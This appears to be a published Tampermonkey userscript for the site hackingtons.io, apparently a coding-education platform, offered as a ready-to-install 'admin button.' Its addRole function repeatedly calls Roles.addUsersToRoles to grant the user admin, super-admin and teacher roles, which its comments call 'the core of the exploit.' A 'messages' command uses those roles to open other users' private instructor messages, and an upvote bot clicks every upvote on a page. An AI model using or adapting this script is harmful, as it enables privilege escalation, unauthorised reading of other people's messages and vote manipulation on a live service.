// ==UserScript==
// @name         Hackingtons Admin Button
// @namespace    http://tampermonkey.net/
// @version      1.02
// @description  Creates a textbox and button that grants *some* admin powers and other perks.
// @author       Cyber Claw Collective
// @match        https://hackingtons.io/*
// @icon         https://i.ibb.co/gFc1xh1/Skiddo-logo-featuring-one-cybernetic-cat-paw-in-an-upwards-dire-d9125238-7149-4a5d-97ee-20c8ec9bed25.png
// @grant        none
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/463506/Hackingtons%20Admin%20Button.user.js
// @updateURL https://update.greasyfork.org/scripts/463506/Hackingtons%20Admin%20Button.meta.js
// ==/UserScript==



//HOW TO USE:

//(All of this will be available when you type "help" in the new text box)

//To toggle admin mode, press the Cyber Claw Collective logo on the bottom right while the text box is completely empty. (currently looking very bad on the home page due to the semi-recent new appearance of the footer.

//To navigate major pages in hackingtons, type "go", followed by home, showcase, hackerbox, zoom, gold, flag, student, roster, logs, gd, or video.

//To use the Upvote Bot, simply go to where you want to upvote, and type "upvotebot", followed by "showcase" or "hackerbox".

//To view instructor messages, type "messages", and the user. For example, "messages admin" would show all of admin's messages, including the "blue" messages that only instructors can see.






(function() {
    'use strict';
    insertButton();
})();

let message;
let spamRoles;
let buttonBool = true;
let getInput = "";


function insertButton()
{

(function() {
    'use strict';

    //This section here creates the UI. I am sure that there had to be a better way to do this lol
    // Creates the translucent grey background
    const background = document.createElement('div');
    background.style.position = 'fixed';
    background.style.bottom = '20px';
    background.style.right = '20px';
    background.style.width = '300px';
    background.style.height = '120px';
    background.style.backgroundColor = 'rgba(128, 128, 128, 0.5)';
    background.style.zIndex = '9999';
    background.style.borderRadius = '10px';

    // Creates the textbox
    const textBox = document.createElement('input');
    textBox.type = 'text';
    textBox.style.position = 'absolute';
    textBox.style.bottom = '20px';
    textBox.style.left = '20px';
    textBox.style.width = '200px';
    textBox.style.padding = '10px';
    textBox.style.borderRadius = '10px';
    textBox.style.backgroundColor = 'black';
    textBox.style.color = 'green';
    textBox.setAttribute("id", "textBox");
    background.appendChild(textBox);

    // Creates the Cyber Claw Collective Button
    const button = document.createElement('button');
    button.style.position = 'absolute';
    button.style.bottom = '20px';
    button.style.right = '20px';
    button.style.width = '50px';
    button.style.height = '50px';
    button.style.borderRadius = '50%';
    button.style.backgroundImage = 'url("https://i.ibb.co/gFc1xh1/Skiddo-logo-featuring-one-cybernetic-cat-paw-in-an-upwards-dire-d9125238-7149-4a5d-97ee-20c8ec9bed25.png")';
    button.style.backgroundSize = 'cover';
    background.appendChild(button);
    button.setAttribute('id','adminButton');

    // Creates the "Hackingtons Admin Button" text above the textbox and button
    const rainbowText = document.createElement('h1');
    rainbowText.textContent = 'Hackingtons Admin Button';
    rainbowText.style.position = 'absolute';
    rainbowText.style.top = '0px';
    rainbowText.style.left = '50%';
    rainbowText.style.transform = 'translateX(-50%)';
    rainbowText.style.fontFamily = 'Arial, sans-serif';
    rainbowText.style.fontSize = '20px';
    rainbowText.style.fontWeight = 'bold';
    rainbowText.style.backgroundImage = 'linear-gradient(to right, violet, indigo, blue, green, yellow, orange, red)';
    rainbowText.style.backgroundClip = 'text';
    rainbowText.style.webkitBackgroundClip = 'text';
    rainbowText.style.color = 'transparent';
    rainbowText.style.whiteSpace = 'nowrap';
    background.appendChild(rainbowText);

    button.addEventListener('click', () => {
       readBox();
    });

    document.body.appendChild(background);
})();




    const footer = document.getElementsByTagName("footer")[0]; //Checks if there is a footer (Like the one of the homepage) and removes it since it covers the added UI.
    if (footer) {
        footer.remove();
    }




    //Allows you to press "Enter" instead of having to press the logo.
    document.getElementById("textBox").addEventListener("keyup", function(event) {
        if (event.keyCode === 13) {
            event.preventDefault();
            document.getElementById("adminButton").click();
        }
    });

}


function addRole(){ //This function here contains the core of the exploit.
    if(buttonBool){
        buttonBool = false;
        spamRoles = setInterval(function(){
            //This gets your Meteor User ID, and then adds some admin (and other) tags to it. However, the role is quickly removed when the auto-check runs,
            // so it must be put in an interval that repeats every 10 miliseconds (Which seemed to work best). However, with this setup, you can typically only view things, and USUALLY not modify
            // or send new information as a true admin could. I haven't researched enough to find out why some things work but not others.
            Roles.addUsersToRoles(Meteor.user()["_id"], ['admin', 'super-admin', 'teacher', 'license', "goldstar"]) //I simply put all the roles I found utilized, not knowing fully what each did at the time.
            // Also, I have no clue what "license" does, but I didn't see a reason not to include it. (I think I has something to do with the creation/deletion of accounts, but I could be wrong.)
        }, 10);
    }else{
        buttonBool = true;
        clearInterval(spamRoles);
    }

}

function readBox(){
    getInput = document.getElementById("textBox").value;
    if(getInput == ""){
        addRole();
    }
    if(getInput.split(' ')[0] == "go"){
        go(getInput.split(' ')[1]);
    }
    if(getInput.split(' ')[0] == "upvotebot"){
        upvoteBot(getInput.split(' ')[1]);
    }
    if(getInput.split(' ')[0] == "messages"){
        messagePeak(getInput.split(' ')[1]);
    }
    if(getInput.split(' ')[0] == "help"){
        help();
    }
}
function go(page){
    if(getInput.split(' ').length < 2){
       Bert.alert('Hi! You need an extra parameter for this, type "help" to see them.',"danger");
     }
    //Wow! Is this ugly or what?
    if(page == "home"){
        window.location.replace("https://hackingtons.io/");
    }
    if(page == "showcase"){
        window.location.replace("https://hackingtons.io/posts/new");
    }
    if(page == "hackerbox"){
        window.location.replace("https://hackingtons.io/questions/New");
    }
    if(page == "zoom"){
        window.location.replace("https://hackingtons.io/adminGoogleMeet");
    }
    if(page == "gold"){
        window.open("https://hackingtonsbest.netlify.app/",'_blank');
    }
    if(page == "flag"){
        window.location.replace("https://hackingtons.io/flag");
    }
    if(page == "students"){
        window.location.replace("https://hackingtons.io/teacher");
    }
    if(page == "roster"){
        window.location.replace("https://hackingtons.io/admin2");
    }
    if(page == "logs"){
        window.location.replace("https://hackingtons.io/postLog");
    }
    if(page == "gd"){
        window.location.replace("https://hackingtons.io/GDshowcase/new");
    }
    if(page == "video"){
        window.location.replace("https://hackingtons.io/videoAdmin");
    }

}


//This doesn't really do anything special except upvote the entire page, but I was bored and decided to make this in a few minutes.
function upvoteBot(target){
    if(target == "hackerbox"){
         for (let i = 0; i < document.getElementsByClassName("hackerUpvote hackerVotable upvotable").length; i++) {
             document.getElementsByClassName("hackerUpvote hackerVotable upvotable")[i].click();
         }
    }
    if(target == "showcase"){
         for (let i = 0; i < document.getElementsByClassName("upvote btn btn-default upvotable").length; i++) {
             document.getElementsByClassName("upvote btn btn-default upvotable")[i].click();
         }
    }else{
        Bert.alert('To use this, type "hackerbox" or "showcase" after this command depending on which page you are on!',"danger");
    }

}

//Combined with the admin button, you can probably see other people's instructor messages. I have not experimented on other users, only myself and the "admin" account.
function messagePeak(user){
    if(getInput.split(' ').length < 2){
        Bert.alert('You need to type a username after this -w-',"danger");
    }else{
        window.location.replace("https://hackingtons.io/teacherCommunication/"+user);
    }
}



function help(){  //Opens the help page :D  (can you find the secret in it?)
    window.open("https://adminscripthelp.netlify.app/",'_blank');
}
